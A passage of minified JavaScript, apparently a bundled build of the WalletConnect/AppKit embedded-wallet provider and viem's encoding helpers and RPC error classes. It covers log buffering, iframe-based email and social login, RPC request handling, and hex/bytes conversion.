this.sizeInBytes}},dH=class{constructor(e){dp(this,"lengthInNodes"),dp(this,"sizeInBytes"),dp(this,"head"),dp(this,"tail"),dp(this,"maxSizeInBytes"),this.head=null,this.tail=null,this.lengthInNodes=0,this.maxSizeInBytes=e,this.sizeInBytes=0}append(e){const n=new zye(e);if(n.size>this.maxSizeInBytes)throw new Error(`[LinkedList] Value too big to insert into list: ${e} with size ${n.size}`);for(;this.size+n.size>this.maxSizeInBytes;)this.shift();this.head?(this.tail&&(this.tail.next=n),this.tail=n):(this.head=n,this.tail=n),this.lengthInNodes++,this.sizeInBytes+=n.size}shift(){if(!this.head)return;const e=this.head;this.head=this.head.next,this.head||(this.tail=null),this.lengthInNodes--,this.sizeInBytes-=e.size}toArray(){const e=[];let n=this.head;for(;n!==null;)e.push(n.value),n=n.next;return e}get length(){return this.lengthInNodes}get size(){return this.sizeInBytes}toOrderedArray(){return Array.from(this)}[Symbol.iterator](){let e=this.head;return{next:()=>{if(!e)return{done:!0,value:null};const n=e.value;return e=e.next,{done:!1,value:n}}}}};var qye=Object.defineProperty,Vye=(t,e,n)=>e in t?qye(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,T3=(t,e,n)=>Vye(t,typeof e!="symbol"?e+"":e,n);let Ore=class{constructor(e,n=XD){T3(this,"logs"),T3(this,"level"),T3(this,"levelValue"),T3(this,"MAX_LOG_SIZE_IN_BYTES"),this.level=e??"error",this.levelValue=Bb.levels.values[this.level],this.MAX_LOG_SIZE_IN_BYTES=n,this.logs=new dH(this.MAX_LOG_SIZE_IN_BYTES)}forwardToConsole(e,n){n===Bb.levels.values.error?console.error(e):n===Bb.levels.values.warn?console.warn(e):n===Bb.levels.values.debug?console.debug(e):n===Bb.levels.values.trace?console.trace(e):console.log(e)}appendToLogs(e){this.logs.append(Rf({timestamp:new Date().toISOString(),log:e}));const n=typeof e=="string"?JSON.parse(e).level:e.level;n>=this.levelValue&&this.forwardToConsole(e,n)}getLogs(){return this.logs}clearLogs(){this.logs=new dH(this.MAX_LOG_SIZE_IN_BYTES)}getLogArray(){return Array.from(this.logs)}logsToBlob(e){const n=this.getLogArray();return n.push(Rf({extraMetadata:e})),new Blob(n,{type:"application/json"})}};var Wye=Object.defineProperty,Gye=(t,e,n)=>e in t?Wye(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Kye=(t,e,n)=>Gye(t,e+"",n);let Zye=class{constructor(e,n=XD){Kye(this,"baseChunkLogger"),this.baseChunkLogger=new Ore(e,n)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}downloadLogsBlobInBrowser(e){const n=URL.createObjectURL(this.logsToBlob(e)),r=document.createElement("a");r.href=n,r.download=`walletconnect-logs-${new Date().toISOString()}.txt`,document.body.appendChild(r),r.click(),document.body.removeChild(r),URL.revokeObjectURL(n)}};var Yye=Object.defineProperty,Qye=(t,e,n)=>e in t?Yye(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Jye=(t,e,n)=>Qye(t,e+"",n);let Xye=class{constructor(e,n=XD){Jye(this,"baseChunkLogger"),this.baseChunkLogger=new Ore(e,n)}write(e){this.baseChunkLogger.appendToLogs(e)}getLogs(){return this.baseChunkLogger.getLogs()}clearLogs(){this.baseChunkLogger.clearLogs()}getLogArray(){return this.baseChunkLogger.getLogArray()}logsToBlob(e){return this.baseChunkLogger.logsToBlob(e)}};var ebe=Object.defineProperty,tbe=Object.defineProperties,nbe=Object.getOwnPropertyDescriptors,fH=Object.getOwnPropertySymbols,rbe=Object.prototype.hasOwnProperty,ibe=Object.prototype.propertyIsEnumerable,hH=(t,e,n)=>e in t?ebe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,gx=(t,e)=>{for(var n in e||(e={}))rbe.call(e,n)&&hH(t,n,e[n]);if(fH)for(var n of fH(e))ibe.call(e,n)&&hH(t,n,e[n]);return t},yx=(t,e)=>tbe(t,nbe(e));function eB(t){return yx(gx({},t),{level:t?.level||Fye.level})}function sbe(t,e,n=FI){return t[n]=e,t}function oa(t,e=FI){return t[e]||""}function obe(t,e,n=FI){const r=oa(t,n);return r.trim()?`${r}/${e}`:e}function aa(t,e,n=FI){const r=obe(t,e,n),i=t.child({context:r});return sbe(i,r,n)}function abe(t){var e,n;const r=new Zye((e=t.opts)==null?void 0:e.level,t.maxSizeInBytes);return{logger:Nre(yx(gx({},t.opts),{level:"trace",browser:yx(gx({},(n=t.opts)==null?void 0:n.browser),{write:i=>r.write(i)})})),chunkLoggerController:r}}function cbe(t){var e;const n=new Xye((e=t.opts)==null?void 0:e.level,t.maxSizeInBytes);return{logger:Nre(yx(gx({},t.opts),{level:"trace"}),n),chunkLoggerController:n}}function $I(t){return typeof t.loggerOverride<"u"&&typeof t.loggerOverride!="string"?{logger:t.loggerOverride,chunkLoggerController:null}:typeof window<"u"?abe(t):cbe(t)}class ube{constructor(e){const n=eB({level:mme}),{logger:r,chunkLoggerController:i}=$I({opts:n});this.logger=aa(r,this.constructor.name),this.chunkLoggerController=i,typeof window<"u"&&this.chunkLoggerController?.downloadLogsBlobInBrowser&&(window.downloadAppKitLogsBlob||(window.downloadAppKitLogsBlob={}),window.downloadAppKitLogsBlob.sdk=()=>{this.chunkLoggerController?.downloadLogsBlobInBrowser&&this.chunkLoggerController.downloadLogsBlobInBrowser({projectId:e})})}}class kre{constructor({projectId:e,chainId:n,enableLogger:r=!0,onTimeout:i,abortController:s,getActiveCaipNetwork:o,getCaipNetworks:a,enableCloudAuthAccount:c,metadata:l,sdkVersion:f,sdkType:h}){this.openRpcRequests=new Map,this.isInitialized=!1,r&&(this.w3mLogger=new ube(e)),this.abortController=s,this.getActiveCaipNetwork=o,this.getCaipNetworks=a;const m=this.getRpcUrl(n);this.projectId=e,this.sdkVersion=f,this.sdkType=h,this.metadata=l,this.w3mFrame=new Bye({projectId:e,isAppClient:!0,chainId:n,enableLogger:r,rpcUrl:m,enableCloudAuthAccount:c}),this.onTimeout=i,this.getLoginEmailUsed()&&this.createFrame()}async createFrame(){this.w3mFrame.initFrame(),this.initPromise=new Promise(e=>{this.w3mFrame.events.onFrameEvent(n=>{n.type===bt.FRAME_READY&&setTimeout(()=>{e()},500)})}),await this.initPromise,await this.syncDappData({metadata:this.metadata,projectId:this.projectId,sdkVersion:this.sdkVersion,sdkType:this.sdkType}),await this.getSmartAccountEnabledNetworks(),this.isInitialized=!0,this.initPromise=void 0}async init(){if(!this.isInitialized){if(this.initPromise){await this.initPromise;return}await this.createFrame()}}getLoginEmailUsed(){return!!$i.get(bt.EMAIL_LOGIN_USED_KEY)}getEmail(){return $i.get(bt.EMAIL)}getUsername(){return $i.get(bt.SOCIAL_USERNAME)}async reload(){try{await this.appEvent({type:bt.APP_RELOAD})}catch(e){throw this.w3mLogger?.logger.error({error:e},"Error reloading iframe"),e}}async connectEmail(e){try{Wa.checkIfAllowedToTriggerEmail(),await this.init();const n=await this.appEvent({type:bt.APP_CONNECT_EMAIL,payload:e});return this.setNewLastEmailLoginTime(),n}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error connecting email"),n}}async connectDevice(){try{return this.appEvent({type:bt.APP_CONNECT_DEVICE})}catch(e){throw this.w3mLogger?.logger.error({error:e},"Error connecting device"),e}}async connectOtp(e){try{return this.appEvent({type:bt.APP_CONNECT_OTP,payload:e})}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error connecting otp"),n}}async isConnected(){try{if(!this.getLoginEmailUsed())return{isConnected:!1};const e=await this.appEvent({type:bt.APP_IS_CONNECTED});return e?.isConnected||this.deleteAuthLoginCache(),e}catch(e){throw this.deleteAuthLoginCache(),this.w3mLogger?.logger.error({error:e},"Error checking connection"),e}}async getChainId(){try{const e=await this.appEvent({type:bt.APP_GET_CHAIN_ID});return this.setLastUsedChainId(e.chainId),e}catch(e){throw this.w3mLogger?.logger.error({error:e},"Error getting chain id"),e}}async getSocialRedirectUri(e){try{return await this.init(),this.appEvent({type:bt.APP_GET_SOCIAL_REDIRECT_URI,payload:e})}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error getting social redirect uri"),n}}async updateEmail(e){try{const n=await this.appEvent({type:bt.APP_UPDATE_EMAIL,payload:e});return this.setNewLastEmailLoginTime(),n}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error updating email"),n}}async updateEmailPrimaryOtp(e){try{return this.appEvent({type:bt.APP_UPDATE_EMAIL_PRIMARY_OTP,payload:e})}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error updating email primary otp"),n}}async updateEmailSecondaryOtp(e){try{const n=await this.appEvent({type:bt.APP_UPDATE_EMAIL_SECONDARY_OTP,payload:e});return this.setLoginSuccess(n.newEmail),n}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error updating email secondary otp"),n}}async syncTheme(e){try{return this.appEvent({type:bt.APP_SYNC_THEME,payload:e})}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error syncing theme"),n}}async syncDappData(e){try{return this.appEvent({type:bt.APP_SYNC_DAPP_DATA,payload:e})}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error syncing dapp data"),n}}async getSmartAccountEnabledNetworks(){try{const e=await this.appEvent({type:bt.APP_GET_SMART_ACCOUNT_ENABLED_NETWORKS});return this.persistSmartAccountEnabledNetworks(e.smartAccountEnabledNetworks),e}catch(e){throw this.persistSmartAccountEnabledNetworks([]),this.w3mLogger?.logger.error({error:e},"Error getting smart account enabled networks"),e}}async setPreferredAccount(e){try{return this.appEvent({type:bt.APP_SET_PREFERRED_ACCOUNT,payload:{type:e}})}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error setting preferred account"),n}}async connect(e){if(e?.socialUri)try{await this.init();const n=this.getRpcUrl(e.chainId),r=await this.appEvent({type:bt.APP_CONNECT_SOCIAL,payload:{uri:e.socialUri,preferredAccountType:e.preferredAccountType,chainId:e.chainId,siwxMessage:e.siwxMessage,rpcUrl:n}});return r.userName&&this.setSocialLoginSuccess(r.userName),this.setLoginSuccess(r.email),this.setLastUsedChainId(r.chainId),this.user=r,r}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error connecting social"),n}else try{const n=e?.chainId||this.getLastUsedChainId()||1,r=await this.getUser({chainId:n,preferredAccountType:e?.preferredAccountType,siwxMessage:e?.siwxMessage,rpcUrl:this.getRpcUrl(n)});return this.setLoginSuccess(r.email),this.setLastUsedChainId(r.chainId),this.user=r,r}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error connecting"),n}}async getUser(e){try{await this.init();const n=e?.chainId||this.getLastUsedChainId()||1,r=await this.appEvent({type:bt.APP_GET_USER,payload:{...e,chainId:n,rpcUrl:this.getRpcUrl(n)}});return this.user=r,r}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error connecting"),n}}async connectSocial({uri:e,chainId:n,preferredAccountType:r}){try{await this.init();const i=this.getRpcUrl(n),s=await this.appEvent({type:bt.APP_CONNECT_SOCIAL,payload:{uri:e,chainId:n,rpcUrl:i,preferredAccountType:r}});return s.userName&&this.setSocialLoginSuccess(s.userName),s}catch(i){throw this.w3mLogger?.logger.error({error:i},"Error connecting social"),i}}async getFarcasterUri(){try{return await this.init(),await this.appEvent({type:bt.APP_GET_FARCASTER_URI})}catch(e){throw this.w3mLogger?.logger.error({error:e},"Error getting farcaster uri"),e}}async connectFarcaster(){try{const e=await this.appEvent({type:bt.APP_CONNECT_FARCASTER});return e.userName&&this.setSocialLoginSuccess(e.userName),e}catch(e){throw this.w3mLogger?.logger.error({error:e},"Error connecting farcaster"),e}}async switchNetwork({chainId:e}){try{const n=this.getRpcUrl(e),r=await this.appEvent({type:bt.APP_SWITCH_NETWORK,payload:{chainId:e,rpcUrl:n}});return this.setLastUsedChainId(r.chainId),r}catch(n){throw this.w3mLogger?.logger.error({error:n},"Error switching network"),n}}async disconnect(){try{return this.deleteAuthLoginCache(),await new Promise(async n=>{const r=setTimeout(()=>{n()},3e3);await this.appEvent({type:bt.APP_SIGN_OUT}),clearTimeout(r),n()})}catch(e){throw this.w3mLogger?.logger.error({error:e},"Error disconnecting"),e}}async request(e){const n=e;try{if(Xn.GET_CHAIN_ID===e.method)return this.getLastUsedChainId();const r=e.chainNamespace||"eip155",i=this.getActiveCaipNetwork(r)?.id;n.chainNamespace=r,n.chainId=i,n.rpcUrl=this.getRpcUrl(i),this.rpcRequestHandler?.(e);const s=await this.appEvent({type:bt.APP_RPC_REQUEST,payload:n});return this.rpcSuccessHandler?.(s,n),s}catch(r){throw this.rpcErrorHandler?.(r,n),this.w3mLogger?.logger.error({error:r},"Error requesting"),r}}onRpcRequest(e){this.rpcRequestHandler=e}onRpcSuccess(e){this.rpcSuccessHandler=e}onRpcError(e){this.rpcErrorHandler=e}onIsConnected(e){this.w3mFrame.events.onFrameEvent(n=>{n.type===bt.FRAME_IS_CONNECTED_SUCCESS&&n.payload.isConnected&&e()})}onNotConnected(e){this.w3mFrame.events.onFrameEvent(n=>{n.type===bt.FRAME_IS_CONNECTED_ERROR&&e(),n.type===bt.FRAME_IS_CONNECTED_SUCCESS&&!n.payload.isConnected&&e()})}onConnect(e){this.w3mFrame.events.onFrameEvent(n=>{n.type===bt.FRAME_GET_USER_SUCCESS&&e(n.payload)})}onSocialConnected(e){this.w3mFrame.events.onFrameEvent(n=>{n.type===bt.FRAME_CONNECT_SOCIAL_SUCCESS&&e(n.payload)})}async getCapabilities(){try{return await this.request({method:"wallet_getCapabilities"})||{}}catch{return{}}}onSetPreferredAccount(e){this.w3mFrame.events.onFrameEvent(n=>{n.type===bt.FRAME_SET_PREFERRED_ACCOUNT_SUCCESS?e(n.payload):n.type===bt.FRAME_SET_PREFERRED_ACCOUNT_ERROR&&e({type:Xn.ACCOUNT_TYPES.EOA})})}getAvailableChainIds(){return Object.keys(this.w3mFrame.networks)}async rejectRpcRequests(){try{await Promise.all(Array.from(this.openRpcRequests.values()).map(async({abortController:e,method:n})=>{Xn.SAFE_RPC_METHODS.includes(n)||e.abort(),await this.appEvent({type:bt.APP_RPC_ABORT})})),this.openRpcRequests.clear()}catch(e){this.w3mLogger?.logger.error({error:e},"Error aborting RPC request")}}async appEvent(e){let n,r;function i(c){return c.replace("@w3m-app/","")}const s=[bt.APP_SYNC_DAPP_DATA,bt.APP_SYNC_THEME,bt.APP_SET_PREFERRED_ACCOUNT],o=i(e.type);return!this.w3mFrame.iframeIsReady&&!s.includes(e.type)&&(r=setTimeout(()=>{this.onTimeout?.("iframe_load_failed"),this.abortController.abort()},2e4)),await this.w3mFrame.frameLoadPromise,clearTimeout(r),[bt.APP_CONNECT_EMAIL,bt.APP_CONNECT_DEVICE,bt.APP_CONNECT_OTP,bt.APP_CONNECT_SOCIAL,bt.APP_GET_SOCIAL_REDIRECT_URI].map(i).includes(o)&&(n=setTimeout(()=>{this.onTimeout?.("iframe_request_timeout"),this.abortController.abort()},12e4)),new Promise((c,l)=>{const f=Math.random().toString(36).substring(7);this.w3mLogger?.logger.info?.({event:e,id:f},"Sending app event"),this.w3mFrame.events.postAppEvent({...e,id:f});const h=new AbortController;if(o==="RPC_REQUEST"){const b=e;this.openRpcRequests.set(f,{...b.payload,abortController:h})}h.signal.addEventListener("abort",()=>{o==="RPC_REQUEST"?l(new Error("Request was aborted")):o!=="GET_FARCASTER_URI"&&l(new Error("Something went wrong"))});const m=(b,w)=>{b.id===f&&(w?.logger.info?.({framEvent:b,id:f},"Received frame response"),this.openRpcRequests.delete(b.id),b.type===`@w3m-frame/${o}_SUCCESS`?(n&&clearTimeout(n),r&&clearTimeout(r),"payload"in b&&c(b.payload),c(void 0)):b.type===`@w3m-frame/${o}_ERROR`&&(n&&clearTimeout(n),r&&clearTimeout(r),"payload"in b&&l(new Error(b.payload?.message||"An error occurred")),l(new Error("An error occurred"))))};this.w3mFrame.events.registerFrameEventHandler(f,b=>m(b,this.w3mLogger),this.abortController.signal)})}setNewLastEmailLoginTime(){$i.set(bt.LAST_EMAIL_LOGIN_TIME,Date.now().toString())}setSocialLoginSuccess(e){$i.set(bt.SOCIAL_USERNAME,e)}setLoginSuccess(e){e&&$i.set(bt.EMAIL,e),$i.set(bt.EMAIL_LOGIN_USED_KEY,"true"),$i.delete(bt.LAST_EMAIL_LOGIN_TIME)}deleteAuthLoginCache(){$i.delete(bt.EMAIL_LOGIN_USED_KEY),$i.delete(bt.EMAIL),$i.delete(bt.LAST_USED_CHAIN_KEY),$i.delete(bt.SOCIAL_USERNAME)}setLastUsedChainId(e){e&&$i.set(bt.LAST_USED_CHAIN_KEY,String(e))}getLastUsedChainId(){const e=$i.get(bt.LAST_USED_CHAIN_KEY)??void 0,n=Number(e);return isNaN(n)?e:n}persistSmartAccountEnabledNetworks(e){$i.set(bt.SMART_ACCOUNT_ENABLED_NETWORKS,e.join(","))}getRpcUrl(e){let n=e===void 0?void 0:"eip155";typeof e=="string"&&(e.includes(":")?n=gi.parseCaipNetworkId(e)?.chainNamespace:Number.isInteger(Number(e))?n="eip155":n="solana");const r=this.getCaipNetworks(n);return(e?r.find(s=>String(s.id)===String(e)||s.caipNetworkId===e):r[0])?.rpcUrls.default.http?.[0]}}function Dre(t,{strict:e=!0}={}){return!t||typeof t!="string"?!1:e?/^0x[0-9a-fA-F]*$/.test(t):t.startsWith("0x")}function pH(t){return Dre(t,{strict:!1})?Math.ceil((t.length-2)/2):t.length}const Bre="2.41.2";let RN={getDocsUrl:({docsBaseUrl:t,docsPath:e="",docsSlug:n})=>e?`${t??"https://viem.sh"}${e}${n?`#${n}`:""}`:void 0,version:`viem@${Bre}`},Tr=class kk extends Error{constructor(e,n={}){const r=n.cause instanceof kk?n.cause.details:n.cause?.message?n.cause.message:n.details,i=n.cause instanceof kk&&n.cause.docsPath||n.docsPath,s=RN.getDocsUrl?.({...n,docsPath:i}),o=[e||"An error occurred.","",...n.metaMessages?[...n.metaMessages,""]:[],...s?[`Docs: ${s}`]:[],...r?[`Details: ${r}`]:[],...RN.version?[`Version: ${RN.version}`]:[]].join(`
`);super(o,n.cause?{cause:n.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),this.details=r,this.docsPath=i,this.metaMessages=n.metaMessages,this.name=n.name??this.name,this.shortMessage=e,this.version=Bre}walk(e){return jre(this,e)}};function jre(t,e){return e?.(t)?t:t&&typeof t=="object"&&"cause"in t&&t.cause!==void 0?jre(t.cause,e):e?null:t}let nZe=class extends Tr{constructor({offset:e,position:n,size:r}){super(`Slice ${n==="start"?"starting":"ending"} at offset "${e}" is out-of-bounds (size: ${r}).`,{name:"SliceOffsetOutOfBoundsError"})}},Mre=class extends Tr{constructor({size:e,targetSize:n,type:r}){super(`${r.charAt(0).toUpperCase()}${r.slice(1).toLowerCase()} size (${e}) exceeds padding size (${n}).`,{name:"SizeExceedsPaddingSizeError"})}};class sZe extends Tr{constructor({size:e,targetSize:n,type:r}){super(`${r.charAt(0).toUpperCase()}${r.slice(1).toLowerCase()} is expected to be ${n} ${r} long, but is ${e} ${r} long.`,{name:"InvalidBytesLengthError"})}}function tw(t,{dir:e,size:n=32}={}){return typeof t=="string"?lbe(t,{dir:e,size:n}):dbe(t,{dir:e,size:n})}function lbe(t,{dir:e,size:n=32}={}){if(n===null)return t;const r=t.replace("0x","");if(r.length>n*2)throw new Mre({size:Math.ceil(r.length/2),targetSize:n,type:"hex"});return`0x${r[e==="right"?"padEnd":"padStart"](n*2,"0")}`}function dbe(t,{dir:e,size:n=32}={}){if(n===null)return t;if(t.length>n)throw new Mre({size:t.length,targetSize:n,type:"bytes"});const r=new Uint8Array(n);for(let i=0;i<n;i++){const s=e==="right";r[s?i:n-i-1]=t[s?i:t.length-i-1]}return r}let fbe=class extends Tr{constructor({max:e,min:n,signed:r,size:i,value:s}){super(`Number "${s}" is not in safe ${i?`${i*8}-bit ${r?"signed":"unsigned"} `:""}integer range ${e?`(${n} to ${e})`:`(above ${n})`}`,{name:"IntegerOutOfRangeError"})}};class aZe extends Tr{constructor(e){super(`Bytes value "${e}" is not a valid boolean. The bytes array must contain a single byte of either a 0 or 1 value.`,{name:"InvalidBytesBooleanError"})}}class hbe extends Tr{constructor(e){super(`Hex value "${e}" is not a valid boolean. The hex value must be "0x0" (false) or "0x1" (true).`,{name:"InvalidHexBooleanError"})}}let pbe=class extends Tr{constructor({givenSize:e,maxSize:n}){super(`Size cannot exceed ${n} bytes. Given size: ${e} bytes.`,{name:"SizeOverflowError"})}};function $T(t,{dir:e="left"}={}){let n=typeof t=="string"?t.replace("0x",""):t,r=0;for(let i=0;i<n.length-1&&n[e==="left"?i:n.length-i-1].toString()==="0";i++)r++;return n=e==="left"?n.slice(r):n.slice(0,n.length-r),typeof t=="string"?(n.length===1&&e==="right"&&(n=`${n}0`),`0x${n.length%2===1?`0${n}`:n}`):n}function Wp(t,{size:e}){if(pH(t)>e)throw new pbe({givenSize:pH(t),maxSize:e})}function mbe(t,e={}){const{signed:n}=e;e.size&&Wp(t,{size:e.size});const r=BigInt(t);if(!n)return r;const i=(t.length-2)/2,s=(1n<<BigInt(i)*8n-1n)-1n;return r<=s?r:r-BigInt(`0x${"f".padStart(i*2,"f")}`)-1n}function uZe(t,e={}){let n=t;if(e.size&&(Wp(n,{size:e.size}),n=$T(n)),$T(n)==="0x00")return!1;if($T(n)==="0x01")return!0;throw new hbe(n)}function lZe(t,e={}){return Number(mbe(t,e))}function dZe(t,e={}){let n=tB(t);return e.size&&(Wp(n,{size:e.size}),n=$T(n,{dir:"right"})),new TextDecoder().decode(n)}const gbe=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function mH(t,e={}){return typeof t=="number"||typeof t=="bigint"?Lre(t,e):typeof t=="string"?Fre(t,e):typeof t=="boolean"?ybe(t,e):Ure(t,e)}function ybe(t,e={}){const n=`0x${Number(t)}`;return typeof e.size=="number"?(Wp(n,{size:e.size}),tw(n,{size:e.size})):n}function Ure(t,e={}){let n="";for(let i=0;i<t.length;i++)n+=gbe[t[i]];const r=`0x${n}`;return typeof e.size=="number"?(Wp(r,{size:e.size}),tw(r,{dir:"right",size:e.size})):r}function Lre(t,e={}){const{signed:n,size:r}=e,i=BigInt(t);let s;r?n?s=(1n<<BigInt(r)*8n-1n)-1n:s=2n**(BigInt(r)*8n)-1n:typeof t=="number"&&(s=BigInt(Number.MAX_SAFE_INTEGER));const o=typeof s=="bigint"&&n?-s-1n:0;if(s&&i>s||i<o){const c=typeof t=="bigint"?"n":"";throw new fbe({max:s?`${s}${c}`:void 0,min:`${o}${c}`,signed:n,size:r,value:`${t}${c}`})}const a=`0x${(n&&i<0?(1n<<BigInt(r*8))+BigInt(i):i).toString(16)}`;return r?tw(a,{size:r}):a}const bbe=new TextEncoder;function Fre(t,e={}){const n=bbe.encode(t);return Ure(n,e)}const wbe=new TextEncoder;function fZe(t,e={}){return typeof t=="number"||typeof t=="bigint"?Ebe(t,e):typeof t=="boolean"?vbe(t,e):Dre(t)?tB(t,e):_be(t,e)}function vbe(t,e={}){const n=new Uint8Array(1);return n[0]=Number(t),typeof e.size=="number"?(Wp(n,{size:e.size}),tw(n,{size:e.size})):n}const Nd={zero:48,nine:57,A:65,F:70,a:97,f:102};function gH(t){if(t>=Nd.zero&&t<=Nd.nine)return t-Nd.zero;if(t>=Nd.A&&t<=Nd.F)return t-(Nd.A-10);if(t>=Nd.a&&t<=Nd.f)return t-(Nd.a-10)}function tB(t,e={}){let n=t;e.size&&(Wp(n,{size:e.size}),n=tw(n,{dir:"right",size:e.size}));let r=n.slice(2);r.length%2&&(r=`0${r}`);const i=r.length/2,s=new Uint8Array(i);for(let o=0,a=0;o<i;o++){const c=gH(r.charCodeAt(a++)),l=gH(r.charCodeAt(a++));if(c===void 0||l===void 0)throw new Tr(`Invalid byte sequence ("${r[a-2]}${r[a-1]}" in "${r}").`);s[o]=c*16+l}return s}function Ebe(t,e){const n=Lre(t,e);return tB(n)}function _be(t,e={}){const n=wbe.encode(t);return typeof e.size=="number"?(Wp(n,{size:e.size}),tw(n,{dir:"right",size:e.size})):n}let Abe=class extends Map{constructor(e){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=e}get(e){const n=super.get(e);return super.has(e)&&n!==void 0&&(this.delete(e),super.set(e,n)),n}set(e,n){if(super.set(e,n),this.maxSize&&this.size>this.maxSize){const r=this.keys().next().value;r&&this.delete(r)}return this}};const Km=(t,e,n)=>JSON.stringify(t,(r,i)=>typeof i=="bigint"?i.toString():i,n),pZe={gwei:9,wei:18},Cbe={ether:-9,wei:9};function nB(t,e){let n=t.toString();const r=n.startsWith("-");r&&(n=n.slice(1)),n=n.padStart(e,"0");let[i,s]=[n.slice(0,n.length-e),n.slice(n.length-e)];return s=s.replace(/(0+)$/,""),`${r?"-":""}${i||"0"}${s?`.${s}`:""}`}function bx(t,e="wei"){return nB(t,Cbe[e])}const mZe=t=>t,rB=t=>t;class nE extends Tr{constructor({body:e,cause:n,details:r,headers:i,status:s,url:o}){super("HTTP request failed.",{cause:n,details:r,metaMessages:[s&&`Status: ${s}`,`URL: ${rB(o)}`,e&&`Request body: ${Km(e)}`].filter(Boolean),name:"HttpRequestError"}),Object.defineProperty(this,"body",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"headers",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"status",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"url",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.body=e,this.headers=i,this.status=s,this.url=o}}class $re extends Tr{constructor({body:e,error:n,url:r}){super("RPC Request failed.",{cause:n,details:n.message,metaMessages:[`URL: ${rB(r)}`,`Request body: ${Km(e)}`],name:"RpcRequestError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"url",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.code=n.code,this.data=n.data,this.url=r}}class yH extends Tr{constructor({body:e,url:n}){super("The request took too long to respond.",{details:"The request timed out.",metaMessages:[`URL: ${rB(n)}`,`Request body: ${Km(e)}`],name:"TimeoutError"}),Object.defineProperty(this,"url",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.url=n}}const Sbe=-1;class ca extends Tr{constructor(e,{code:n,docsPath:r,metaMessages:i,name:s,shortMessage:o}){super(o,{cause:e,docsPath:r,metaMessages:i||e?.metaMessages,name:s||"RpcError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.name=s||e.name,this.code=e instanceof $re?e.code:n??Sbe}}class Xa extends ca{constructor(e,n){super(e,n),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=n.data}}class UE extends ca{constructor(e){super(e,{code:UE.code,name:"ParseRpcError",shortMessage:"Invalid JSON was received by the server. An error occurred on the server while parsing the JSON text."})}}Object.defineProperty(UE,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32700});class LE extends ca{constructor(e){super(e,{code:LE.code,name:"InvalidRequestRpcError",shortMessage:"JSON is not a valid request object."})}}Object.defineProperty(LE,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32600});class FE extends ca{constructor(e,{method:n}={}){super(e,{code:FE.code,name:"MethodNotFoundRpcError",shortMessage:`The method${n?` "${n}"`:""} does not exist / is not available.`})}}Object.defineProperty(FE,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32601});class $E extends ca{constructor(e){super(e,{code:$E.code,name:"InvalidParamsRpcError",shortMessage:["Invalid parameters were provided to the RPC method.","Double check you have provided the correct parameters."].join(`
`)})}}Object.defineProperty($E,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32602});class v1 extends ca{constructor(e){super(e,{code:v1.code,name:"InternalRpcError",shortMessage:"An internal error was received."})}}Object.defineProperty(v1,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32603});class HE extends ca{constructor(e){super(e,{code:HE.code,name:"InvalidInputRpcError",shortMessage:["Missing or invalid parameters.","Double check you have provided the correct parameters."].join(`
`)})}}Object.defineProperty(HE,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32e3});class zE extends ca{constructor(e){super(e,{code:zE.code,name:"ResourceNotFoundRpcError",shortMessage:"Requested resource not found."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ResourceNotFoundRpcError"})}}Object.defineProperty(zE,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32001});class qE extends ca{constructor(e){super(e,{code:qE.code,name:"ResourceUnavailableRpcError",shortMessage:"Requested resource not available."})}}Object.defineProperty(qE,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32002});class E1 extends ca{constructor(e){super(e,{code:E1.code,name:"TransactionRejectedRpcError",shortMessage:"Transaction creation failed."})}}Object.defineProperty(E1,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32003});class Dm extends 